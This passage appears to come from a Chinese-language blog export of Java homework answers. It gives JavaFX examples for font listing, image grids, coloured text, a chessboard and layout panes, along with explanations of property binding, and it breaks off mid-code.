<p>可以将 Control或者 Pane 直接置于Scene 中吗?<br>
可以。Control和Pane都是Parent的子类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Button</span> button <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>button<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="如何找到系统中所有可用的字体"><a class="markdownIt-Anchor" href="#如何找到系统中所有可用的字体"></a> 如何找到系统中所有可用的字体？</h2>
<p>使用javafx.scene.text.Font类中的getFamilies()方法来获取系统中所有可用的字体家族名称</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Font</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListFonts</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 获取所有字体家族</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> family <span class="token operator">:</span> <span class="token class-name">Font</span><span class="token punctuation">.</span><span class="token function">getFamilies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>family<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="显示图像在一个网格面板里面显示4个图像"><a class="markdownIt-Anchor" href="#显示图像在一个网格面板里面显示4个图像"></a> （显示图像）在一个网格面板里面显示4个图像</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">Image</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">ImageView</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">GridPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImageGrid</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">GridPane</span> grid <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> imageUrl <span class="token operator">=</span> <span class="token string">"E:\\Repos\\Course\\Java\\my\\code\\W3\\demo\\src\\main\\java\\com\\example\\avatar16.png"</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建4个图像视图</span>
        <span class="token class-name">ImageView</span> imgView1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span>imageUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imgView2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span>imageUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imgView3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span>imageUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imgView4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span>imageUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将图像视图添加到网格的适当位置</span>
        grid<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>imgView1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        grid<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>imgView2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        grid<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>imgView3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        grid<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>imgView4<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>grid<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Image Grid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPbPgC8.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPbPgC8.png'">
<h2 id="颜色和字体请写一个程序可以垂直显示-5个文字如图14-44a-所示-对每个文字设置一个随机颜色和透明度并且将每个文字的字体设置为-timesromes-bold-italic大小为-22-像素"><a class="markdownIt-Anchor" href="#颜色和字体请写一个程序可以垂直显示-5个文字如图14-44a-所示-对每个文字设置一个随机颜色和透明度并且将每个文字的字体设置为-timesromes-bold-italic大小为-22-像素"></a> (颜色和字体)请写一个程序，可以垂直显示 5个文字，如图14-44a 所示。对每个文字设置一个随机颜色和透明度，并且将每个文字的字体设置为 TimesRomes、bold、italic，大小为 22 像素</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Font</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">FontPosture</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">FontWeight</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Text</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ColorFontDemo</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10为文本间的垂直间距</span>
        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> words <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Text1"</span><span class="token punctuation">,</span> <span class="token string">"Text2"</span><span class="token punctuation">,</span> <span class="token string">"Text3"</span><span class="token punctuation">,</span> <span class="token string">"Text4"</span><span class="token punctuation">,</span> <span class="token string">"Text5"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> word <span class="token operator">:</span> words<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Text</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>
            text<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token function">randomColorWithOpacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置随机颜色和透明度</span>
            text<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span><span class="token class-name">Font</span><span class="token punctuation">.</span><span class="token function">font</span><span class="token punctuation">(</span><span class="token string">"Times New Roman"</span><span class="token punctuation">,</span> <span class="token class-name">FontWeight</span><span class="token punctuation">.</span><span class="token constant">BOLD</span><span class="token punctuation">,</span> <span class="token class-name">FontPosture</span><span class="token punctuation">.</span><span class="token constant">ITALIC</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置字体</span>
            vbox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"ColorFontDemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 生成带透明度的随机颜色</span>
    <span class="token keyword">private</span> <span class="token class-name">Color</span> <span class="token function">randomColorWithOpacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Random</span> rand <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Color</span><span class="token punctuation">(</span>rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPbP28S.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPbP28S.png'">
<h2 id="游戏显示一个象棋棋盘-请写一个程序显示一个象棋棋盘其中每个黑白单元格都是一个填充了黑色或者白色的-rectangle"><a class="markdownIt-Anchor" href="#游戏显示一个象棋棋盘-请写一个程序显示一个象棋棋盘其中每个黑白单元格都是一个填充了黑色或者白色的-rectangle"></a> (游戏:显示一个象棋棋盘 )请写一个程序显示一个象棋棋盘，其中每个黑白单元格都是一个填充了黑色或者白色的 Rectangle</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">GridPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Rectangle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Chessboard</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">TILE_SIZE</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">BOARD_SIZE</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">GridPane</span> grid <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> row <span class="token operator">&lt;</span> <span class="token constant">BOARD_SIZE</span><span class="token punctuation">;</span> row<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> col <span class="token operator">&lt;</span> <span class="token constant">BOARD_SIZE</span><span class="token punctuation">;</span> col<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">Rectangle</span> tile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token constant">TILE_SIZE</span><span class="token punctuation">,</span> <span class="token constant">TILE_SIZE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Color</span> color<span class="token punctuation">;</span>

                <span class="token comment">// 根据行和列的奇偶性决定方块的颜色</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>row <span class="token operator">+</span> col<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    color <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">WHITE</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    color <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                tile<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">;</span>
                grid<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tile<span class="token punctuation">,</span> col<span class="token punctuation">,</span> row<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>grid<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Chessboard"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPbP64f.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/27/pPbP64f.png'">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-4</title>
    <url>/2023/10/10/16-42-21/</url>
    <content><![CDATA[<p>什么是绑定属性？什么接口定义绑定属性？什么接口定义源对象？ int、long、float、double,以及boolean的绑定对象类型是什么？Integer 和 Double 是绑定属性吗？ Integer和Double可以在一个绑定中作为源对象吗？<br>
七种面板<br>
如何在一个 FlowPane 和 GridPane中设置节点间的水平间隔和垂直间隔为 8 像素，以及如何在 HBox 和 VBox 中设置间距为 8 像素<br>
四风扇、圆柱、BarCharts、可变网格</p>
<span id="more"></span>
<h2 id="什么是绑定属性什么接口定义绑定属性什么接口定义源对象-int-long-float-double以及boolean的绑定对象类型是什么integer-和-double-是绑定属性吗-integer和double可以在一个绑定中作为源对象吗"><a class="markdownIt-Anchor" href="#什么是绑定属性什么接口定义绑定属性什么接口定义源对象-int-long-float-double以及boolean的绑定对象类型是什么integer-和-double-是绑定属性吗-integer和double可以在一个绑定中作为源对象吗"></a> 什么是绑定属性？什么接口定义绑定属性？什么接口定义源对象？ int、long、float、double,以及boolean的绑定对象类型是什么？Integer 和 Double 是绑定属性吗？ Integer和Double可以在一个绑定中作为源对象吗？</h2>
<ul>
<li>绑定属性是指能够与其他属性进行绑定的属性。这些属性通常是 <code>Property</code> 类型，例如 <code>SimpleIntegerProperty</code>、<code>SimpleStringProperty</code> 等</li>
<li>JavaFX 中定义绑定属性的接口是 <code>javafx.beans.property.Property&lt;T&gt;</code></li>
<li>源对象通常是指那些可以观察的对象，其值的变化可以被其他对象所观察。这些对象实现了 Observable 接口。</li>
</ul>
<table>
<thead>
<tr>
<th>基本数据类型</th>
<th>绑定对象类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>int</td>
<td>IntegerProperty</td>
</tr>
<tr>
<td>long</td>
<td>LongProperty</td>
</tr>
<tr>
<td>float</td>
<td>FloatProperty</td>
</tr>
<tr>
<td>double</td>
<td>DoubleProperty</td>
</tr>
<tr>
<td>boolean</td>
<td>BooleanProperty</td>
</tr>
</tbody>
</table>
<ul>
<li><code>Integer</code> 和 <code>Double</code> 本身是 Java 的封装类型，而不是 JavaFX 的绑定属性。但是，JavaFX 提供了相应的 <code>Property</code> 类型（如 <code>IntegerProperty</code> 和 <code>DoubleProperty</code>）来使这些基本数据类型具有绑定特性。</li>
<li>不能直接将一个 <code>IntegerProperty</code> 与一个 <code>DoubleProperty</code> 绑定。但是可以使用转换或其他中间步骤来完成。例如创建一个计算绑定，其中一个属性的值是基于另一个属性的值进行计算的。在这种情况下，可以将 <code>DoubleProperty</code> 的值转换为整数，并与 <code>IntegerProperty</code> 进行绑定。</li>
</ul>
<h2 id="如何将一个节点加入到一个pane-stackpane-flowpane-gridpane-borderpane-hbox-vbox-中如何从这些面板中移除一个节点并解释一下这七种面板的特点"><a class="markdownIt-Anchor" href="#如何将一个节点加入到一个pane-stackpane-flowpane-gridpane-borderpane-hbox-vbox-中如何从这些面板中移除一个节点并解释一下这七种面板的特点"></a> 如何将一个节点加入到一个Pane、StackPane、FlowPane、GridPane、BorderPane、HBox、VBox 中？如何从这些面板中移除一个节点？并解释一下这七种面板的特点</h2>
<table>
<thead>
<tr>
<th>面板</th>
<th>添加操作</th>
<th>移除操作</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td>Pane</td>
<td><code>pane.getChildren().add(node);</code></td>
<td><code>pane.getChildren().remove(node);</code></td>
<td>基本布局，无特殊布局安排。</td>
</tr>
<tr>
<td>StackPane</td>
<td><code>stackPane.getChildren().add(node);</code></td>
<td><code>stackPane.getChildren().remove(node);</code></td>
<td>将子节点堆叠在同一位置，默认居中。</td>
</tr>
<tr>
<td>FlowPane</td>
<td><code>flowPane.getChildren().add(node);</code></td>
<td><code>flowPane.getChildren().remove(node);</code></td>
<td>从左到右或从上到下排列子节点，自动换行。</td>
</tr>
<tr>
<td>GridPane</td>
<td><code>gridPane.add(node, columnIndex, rowIndex);</code></td>
<td><code>gridPane.getChildren().remove(node);</code></td>
<td>网格布局，按指定行和列放置组件。</td>
</tr>
<tr>
<td>BorderPane</td>
<td>根据区域，如：<code>borderPane.setTop(node);</code></td>
<td><code>borderPane.getChildren().remove(node);</code></td>
<td>五个区域（上、下、左、右、中心）布局。</td>
</tr>
<tr>
<td>HBox</td>
<td><code>hBox.getChildren().add(node);</code></td>
<td><code>hBox.getChildren().remove(node);</code></td>
<td>水平盒子，从左到右排列子节点。</td>
</tr>
<tr>
<td>VBox</td>
<td><code>vBox.getChildren().add(node);</code></td>
<td><code>vBox.getChildren().remove(node);</code></td>
<td>垂直盒子，从上到下排列子节点。</td>
</tr>
</tbody>
</table>
<h2 id="如何在一个-flowpane-和-gridpane中设置节点间的水平间隔和垂直间隔为-8-像素以及如何在-hbox-和-vbox-中设置间距为-8-像素"><a class="markdownIt-Anchor" href="#如何在一个-flowpane-和-gridpane中设置节点间的水平间隔和垂直间隔为-8-像素以及如何在-hbox-和-vbox-中设置间距为-8-像素"></a> 如何在一个 FlowPane 和 GridPane中设置节点间的水平间隔和垂直间隔为 8 像素，以及如何在 HBox 和 VBox 中设置间距为 8 像素？</h2>
<ul>
<li>
<p>FlowPane:<br>
– 水平间隔: flowPane.setHgap(8);<br>
– 垂直间隔: flowPane.setVgap(8);</p>
</li>
<li>
<p>GridPane:<br>
– 水平间隔: gridPane.setHgap(8);<br>
– 垂直间隔: gridPane.setVgap(8);</p>
</li>
<li>
<p>HBox:<br>
– 间距: hBox.setSpacing(8);</p>
</li>
<li>
<p>VBox:<br>
– 间距: vBox.setSpacing(8);</p>
</li>
</ul>
<h2 id="创建四个风扇请写一个程序将四个风扇按照两行两列置于一个gridpane-中如图14-45b所示"><a class="markdownIt-Anchor" href="#创建四个风扇请写一个程序将四个风扇按照两行两列置于一个gridpane-中如图14-45b所示"></a> （创建四个风扇）请写一个程序，将四个风扇按照两行两列置于一个GridPane 中，如图14-45b所示</h2>
<img src="/images/posts/pPzdP8e.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzdP8e.png'">
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">GridPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
